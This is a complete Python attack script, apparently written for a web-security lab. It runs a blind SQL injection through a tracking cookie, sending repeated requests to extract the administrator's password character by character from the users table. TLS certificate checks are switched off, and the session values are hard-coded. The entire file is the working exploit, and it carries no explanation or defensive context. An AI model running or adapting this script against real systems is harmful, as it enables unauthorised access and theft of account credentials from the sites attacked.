import sys
import requests
import urllib3
import urllib


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_blind_pass(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' AND (select ascii(substring(password,%s,1)) from users where username = 'administrator') = '%s'--"%(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId':'Azv8t8bPqbSfUxTE' + sqli_payload_encoded,'session':'YkxzPQeiYqGXdnLDlH4lJXdLfiVlBvZv'}
            r = requests.get(url,cookies = cookie,verify=False)
            if 'Welcome' not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) !=2 :
        print("index error")
    url = sys.argv[1]
    print("[+] Retrieving Administrator Password...")
    sqli_blind_pass(url)

if __name__ == "__main__":
    main()